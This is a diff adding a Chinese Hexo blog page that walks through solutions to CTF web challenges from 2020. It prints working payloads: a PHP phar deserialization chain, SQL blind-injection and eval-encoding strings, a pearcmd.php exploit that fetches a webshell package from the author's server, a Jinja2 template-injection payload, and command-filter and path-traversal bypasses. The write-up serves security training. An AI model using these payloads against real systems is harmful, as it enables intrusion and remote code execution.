@@ -1,0 +1,381 @@
+
+ <!DOCTYPE HTML>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+  
+    <title>极客巅峰+月饼赛 | buxqm</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=3, minimum-scale=1">
+    
+    <meta name="author" content="Ycj">
+    
+    <meta name="description" content="BABYPHP2www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。
+链子还是比较简单的。
+123456789101112131415161718192021222324252627282930313233343536&amp;lt;?phpclass User&amp;#123;    ">
+    
+    
+    
+    
+    
+    <link rel="icon" href="/img/favicon.ico">
+    
+    
+    <link rel="apple-touch-icon" href="/img/author.jpg">
+    <link rel="apple-touch-icon-precomposed" href="/img/author.jpg">
+    
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+  <body>
+    <header>
+      <div>
+		
+			<div id="imglogo">
+				<a href="/"><img src="/img/logo.svg" alt="buxqm" title="buxqm"/></a>
+			</div>
+			
+			<div id="textlogo">
+				<h1 class="site-name"><a href="/" title="buxqm">buxqm</a></h1>
+				<h2 class="blog-motto"></h2>
+			</div>
+			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
+			</a></div>
+			<nav class="animated">
+				<ul>
+					
+						<li><a href="/">Home</a></li>
+					
+						<li><a href="/archives">Archives</a></li>
+					
+					<li>
+					
+					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
+						<label>Search</label>
+						<input type="text" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search" />
+						<input type="hidden" name="q" value="site:yoursite.com">
+					</form>
+					
+					</li>
+				</ul>
+			</nav>			
+</div>
+
+    </header>
+    <div id="container">
+      <div id="main" class="post" itemscope itemprop="blogPost">
+	<article itemprop="articleBody"> 
+		<header class="article-info clearfix">
+  <h1 itemprop="name">
+    
+      <a href="/2020/06/30/极客巅峰/" title="极客巅峰+月饼赛" itemprop="url">极客巅峰+月饼赛</a>
+  </h1>
+  <p class="article-author">By
+    
+      <a href="http://yoursite.com" title="Ycj">Ycj</a>
+    </p>
+  <p class="article-time">
+    <time datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished">2020-06-30</time>
+    Updated:<time datetime="2020-09-27T14:14:41.810Z" itemprop="dateModified">2020-09-27</time>
+    
+  </p>
+</header>
+	<div class="article-content">
+		
+		
+		<div id="toc" class="toc-article">
+			<strong class="toc-title">Contents</strong>
+		<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BABYPHP2"><span class="toc-number">1.</span> <span class="toc-text">BABYPHP2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyback"><span class="toc-number">2.</span> <span class="toc-text">babyback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meow-world"><span class="toc-number">3.</span> <span class="toc-text">meow world</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyflask"><span class="toc-number">4.</span> <span class="toc-text">babyflask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#月饼赛"><span class="toc-number">5.</span> <span class="toc-text">月饼赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-故人心"><span class="toc-number">5.1.</span> <span class="toc-text">web2_故人心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-莫负婵娟"><span class="toc-number">5.2.</span> <span class="toc-text">web3_莫负婵娟</span></a></li></ol></li></ol>
+		</div>
+		
+		<h1 id="BABYPHP2"><a href="#BABYPHP2" class="headerlink" title="BABYPHP2"></a>BABYPHP2</h1><p><a href="http://www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。" target="_blank" rel="noopener">www.zip源码泄露，审查源码发现文件上传和读取，可以构造phar反序列化。</a></p>
+<p>链子还是比较简单的。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $nickname=<span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">public</span> $backup;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;nickname=<span class="keyword">new</span> Reader();</span><br><span class="line">    <span class="keyword">$this</span>-&gt;backup=<span class="string">"/flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;nickname-&gt;backup=<span class="keyword">$this</span>-&gt;backup;</span><br><span class="line">        $user = <span class="keyword">new</span> User();</span><br><span class="line">        $user-&gt;id = $_SESSION[<span class="string">'id'</span>];</span><br><span class="line">        $user-&gt;nickname = $_SESSION[<span class="string">'token'</span>];</span><br><span class="line">        <span class="keyword">return</span> serialize($user);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="keyword">new</span> User();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Reader</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> dbCtrl();</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">$phar-&gt;setMetadata($a); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<p>使用compress.zlib://phar:// 绕过WAF，读取flag。</p>
+<h1 id="babyback"><a href="#babyback" class="headerlink" title="babyback"></a>babyback</h1><p>过滤了单引号，使反斜杠绕过，sleep盲注获得admin密码登录后台。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=\&amp;password=<span class="keyword">or</span> <span class="keyword">if</span>((ascii(substr((password),<span class="number">1</span>,<span class="number">1</span>))&lt;<span class="number">120</span>),sleep(<span class="number">2</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>后台是一个eval($cmd.’=FALSE’)命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="meta">?&gt;</span><span class="meta">&lt;?</span>=<span class="keyword">require</span>%<span class="number">0</span>a~%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>?%<span class="number">3</span>E</span><br></pre></td></tr></table></figure>
+
+<h1 id="meow-world"><a href="#meow-world" class="headerlink" title="meow world"></a>meow world</h1><p>根据提示 ，搜到了一篇文章<a href="https://khack40.info/camp-ctf-2015-trolol-web-write-up/" target="_blank" rel="noopener">CAMPCTF</a>，并且找到了pearcmd.php，读取源码 ，发现通过argv参数可以getshell。</p>
+<p>由于启动了register_argc_argv ，argv可以直接通过GET传参获取，使用+可以分隔数组。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=pearcmd&amp;argv=<span class="number">1</span>+<span class="keyword">list</span></span><br></pre></td></tr></table></figure>
+
+<p>此命令列出了已安装的pear软件包。 </p>
+<p>根据文章中所述，可以通过install pear安装包上传shell，按照文章中打包好安装包，并放在自己的服务器下。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=pearcmd&amp;argv=<span class="keyword">list</span>+install+--installroot+/tmp/+http:<span class="comment">//ip+port/upload.tar.gz</span></span><br></pre></td></tr></table></figure>
+
+<p>成功安装，安装后的路径是由/tmp+pearcmd.php所在路径+doc+安装包内路径组成，通过报错获得pearcmd.php所在路径为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=/?f=/tmp/usr/local/lib/php/doc/Archive_Tar/Archive/<span class="keyword">eval</span></span><br></pre></td></tr></table></figure>
+
+<p>成功getshell,使用蚁剑连接后台，还需要写一个计算题。</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> strict;</span><br><span class="line"><span class="keyword">use</span> IPC::Open3;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $pid = open3( \*CHLD_IN, \*CHLD_OUT, \*CHLD_ERR, <span class="string">'/readflag'</span> )</span><br><span class="line">  <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">"open3() failed $!"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $r;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r =<span class="keyword">substr</span>($r,<span class="number">0</span>,<span class="number">11</span>);</span><br><span class="line">$r = <span class="keyword">eval</span> <span class="string">"$r"</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r\n"</span>;</span><br><span class="line"><span class="keyword">print</span> CHLD_IN <span class="string">"$r\n"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br><span class="line">$r = &lt;CHLD_OUT&gt;;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"$r"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>成功读取flag。</p>
+<h1 id="babyflask"><a href="#babyflask" class="headerlink" title="babyflask"></a>babyflask</h1><p>一把梭</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("cat /flag").read()'</span>) &#125;&#125;</span><br><span class="line">  &#123;% endif %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="月饼赛"><a href="#月饼赛" class="headerlink" title="月饼赛"></a>月饼赛</h1><h2 id="web2-故人心"><a href="#web2-故人心" class="headerlink" title="web2_故人心"></a>web2_故人心</h2><p>第一关科学计数法造成浮点数溢出<code>payload=1e-199</code>。</p>
+<p>第二关md2 0e弱比较</p>
+<p>单次md2加密：0e652024452</p>
+<p>两次md2加密：0e603448399</p>
+<p>第三关：要求host必须含有ctfshow.com,使用文件夹路径绕过：a://ctfshow.com/../../../../../fl0g.txt </p>
+<h2 id="web3-莫负婵娟"><a href="#web3-莫负婵娟" class="headerlink" title="web3_莫负婵娟"></a>web3_莫负婵娟</h2><p>第一关LIKE注入，发现没有过滤_，于是先用_爆出密码位数，然后一位一位爆破，进入第二关。</p>
+<p>第二关命令执行，过滤了所有小写字母，使用环境变量$path构造出<code>nl ????.???</code>读取flag.php。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;PATH:14:1&#125;</span><span class="variable">$&#123;PATH:21:1&#125;</span> ????.???</span><br></pre></td></tr></table></figure>
+
+  
+	</div>
+		<footer class="article-footer clearfix">
+
+
+<div class="article-categories">
+  <span></span>
+  <a class="article-category-link" href="/categories/专题-writeup/">专题  writeup</a>
+</div>
+
+
+
+<div class="article-share" id="share">
+
+  <div data-url="http://yoursite.com/2020/06/30/极客巅峰/" data-title="极客巅峰+月饼赛 | buxqm" data-tsina="" class="share clearfix">
+  </div>
+
+</div>
+</footer>   	       
+	</article>
+	
+<nav class="article-nav clearfix">
+ 
+ <div class="prev" >
+ <a href="/2020/06/30/JavaWeb专题/" title="TomCat">
+  <strong>PREVIOUS:</strong><br/>
+  <span>
+  TomCat</span>
+</a>
+</div>
+
+
+<div class="next">
+<a href="/2019/09/10/BUUCTF/"  title="BUUCTF">
+ <strong>NEXT:</strong><br/> 
+ <span>BUUCTF
+</span>
+</a>
+</div>
+
+</nav>
+
+	
+<section class="comment">
+	<div class="ds-thread"></div>
+</section>
+
+</div>  
+      <div class="openaside"><a class="navbutton" href="#" title="Show Sidebar"></a></div>
+
+  <div id="toc" class="toc-aside">
+  <strong class="toc-title">Contents</strong>
+  <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#BABYPHP2"><span class="toc-number">1.</span> <span class="toc-text">BABYPHP2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyback"><span class="toc-number">2.</span> <span class="toc-text">babyback</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#meow-world"><span class="toc-number">3.</span> <span class="toc-text">meow world</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#babyflask"><span class="toc-number">4.</span> <span class="toc-text">babyflask</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#月饼赛"><span class="toc-number">5.</span> <span class="toc-text">月饼赛</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web2-故人心"><span class="toc-number">5.1.</span> <span class="toc-text">web2_故人心</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3-莫负婵娟"><span class="toc-number">5.2.</span> <span class="toc-text">web3_莫负婵娟</span></a></li></ol></li></ol>
+  </div>
+
+<div id="asidepart">
+<div class="closeaside"><a class="closebutton" href="#" title="Hide Sidebar"></a></div>
+<aside class="clearfix">
+
+  
+<div class="categorieslist">
+	<p class="asidetitle">Categories</p>
+		<ul>
+		
+			<li><a href="/categories/WebBook/" title="WebBook">WebBook<sup>0</sup></a></li>
+		
+			<li><a href="/categories/docker/" title="docker">docker<sup>1</sup></a></li>
+		
+			<li><a href="/categories/sql注入/" title="sql注入">sql注入<sup>0</sup></a></li>
+		
+			<li><a href="/categories/writeup/" title="writeup">writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/xss学习/" title="xss学习">xss学习<sup>0</sup></a></li>
+		
+			<li><a href="/categories/专题-JavaWeb/" title="专题  JavaWeb">专题  JavaWeb<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-Python/" title="专题  Python">专题  Python<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-XXE/" title="专题  XXE">专题  XXE<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-writeup/" title="专题  writeup">专题  writeup<sup>1</sup></a></li>
+		
+			<li><a href="/categories/专题-可视神经网络/" title="专题  可视神经网络">专题  可视神经网络<sup>1</sup></a></li>
+		
+		</ul>
+</div>
+
+
+  
+
+  <div class="rsspart">
+	<a href="" target="_blank" title="rss">RSS</a>
+</div>
+
+</aside>
+</div>
+    </div>
+    <footer><div id="footer" >
+	
+	<div class="line">
+		<span></span>
+		<div class="author"></div>
+	</div>
+	
+	
+	<section class="info">
+		<p> Hello <br/>
+			似水流年</p>
+	</section>
+	 
+	<div class="social-font clearfix">
+		
+		
+		
+		
+		
+	</div>
+		<p class="copyright">Powered by <a href="http://hexo.io" target="_blank" title="hexo">hexo</a> and Theme by <a href="https://github.com/A-limon/pacman" target="_blank" title="Pacman">Pacman</a> © 2020 
+		
+		<a href="http://yoursite.com" target="_blank" title="Ycj">Ycj</a>
+		
+		</p>
+</div>
+</footer>
+    <script src="/js/jquery-2.1.0.min.js"></script>
+<script type="text/javascript">
+$(document).ready(function(){ 
+  $('.navbar').click(function(){
+    $('header nav').toggleClass('shownav');
+  });
+  var myWidth = 0;
+  function getSize(){
+    if( typeof( window.innerWidth ) == 'number' ) {
+      myWidth = window.innerWidth;
+    } else if( document.documentElement && document.documentElement.clientWidth) {
+      myWidth = document.documentElement.clientWidth;
+    };
+  };
+  var m = $('#main'),
+      a = $('#asidepart'),
+      c = $('.closeaside'),
+      o = $('.openaside');
+  $(window).resize(function(){
+    getSize(); 
+    if (myWidth >= 1024) {
+      $('header nav').removeClass('shownav');
+    }else
+    {
+      m.removeClass('moveMain');
+      a.css('display', 'block').removeClass('fadeOut');
+      o.css('display', 'none');
+      
+      $('#toc.toc-aside').css('display', 'none');
+        
+    }
+  });
+  c.click(function(){
+    a.addClass('fadeOut').css('display', 'none');
+    o.css('display', 'block').addClass('fadeIn');
+    m.addClass('moveMain');
+  });
+  o.click(function(){
+    o.css('display', 'none').removeClass('beforeFadeIn');
+    a.css('display', 'block').removeClass('fadeOut').addClass('fadeIn');      
+    m.removeClass('moveMain');
+  });
+  $(window).scroll(function(){
+    o.css("top",Math.max(80,260-$(this).scrollTop()));
+  });
+});
+</script>
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var ai = $('.article-content>iframe'),
+      ae = $('.article-content>embed'),
+      t  = $('#toc'),
+      h  = $('article h2')
+      ah = $('article h2'),
+      ta = $('#toc.toc-aside'),
+      o  = $('.openaside'),
+      c  = $('.closeaside');
+  if(ai.length>0){
+    ai.wrap('<div class="video-container" />');
+  };
+  if(ae.length>0){
+   ae.wrap('<div class="video-container" />');
+  };
+  if(ah.length==0){
+    t.css('display','none');
+  }else{
+    c.click(function(){
+      ta.css('display', 'block').addClass('fadeIn');
+    });
+    o.click(function(){
+      ta.css('display', 'none');
+    });
+    $(window).scroll(function(){
+      ta.css("top",Math.max(140,320-$(this).scrollTop()));
+    });
+  };
+});
+</script>
+
+
+<script type="text/javascript">
+$(document).ready(function(){ 
+  var $this = $('.share'),
+      url = $this.attr('data-url'),
+      encodedUrl = encodeURIComponent(url),
+      title = $this.attr('data-title'),
+      tsina = $this.attr('data-tsina');
+  var html = [
+  '<a href="#" class="overlay" id="qrcode"></a>',
+  '<div class="qrcode clearfix"><span>扫描二维码分享到微信朋友圈</span><a class="qrclose" href="#share"></a><strong>Loading...Please wait</strong><img id="qrcode-pic" data-src="http://s.jiathis.com/qrcode.php?url=' + encodedUrl + '"/></div>',
+  '<a href="#textlogo" class="article-back-to-top" title="Top"></a>',
+  '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="article-share-facebook" target="_blank" title="Facebook"></a>',
+  '<a href="#qrcode" class="article-share-qrcode" title="QRcode"></a>',
+  '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="article-share-twitter" target="_blank" title="Twitter"></a>',
+  '<a href="http://service.weibo.com/share/share.php?title='+title+'&url='+encodedUrl +'&ralateUid='+ tsina +'&searchPic=true&style=number' +'" class="article-share-weibo" target="_blank" title="Weibo"></a>',
+  '<span title="Share to"></span>'
+  ].join('');
+  $this.append(html);
+  $('.article-share-qrcode').click(function(){
+    var imgSrc = $('#qrcode-pic').attr('data-src');
+    $('#qrcode-pic').attr('src', imgSrc);
+    $('#qrcode-pic').load(function(){
+        $('.qrcode strong').text(' ');
+    });
+  });
+});     
+</script>
+
+
+<script type="text/javascript">
+  var duoshuoQuery = {short_name:""};
+  (function() {
+    var ds = document.createElement('script');
+    ds.type = 'text/javascript';ds.async = true;
+    ds.src = '//static.duoshuo.com/embed.js';
+    ds.charset = 'UTF-8';
+    (document.getElementsByTagName('head')[0] 
+    || document.getElementsByTagName('body')[0]).appendChild(ds);
+  })();
+</script> 
+
+
+
+
+
+  </body>
+</html>
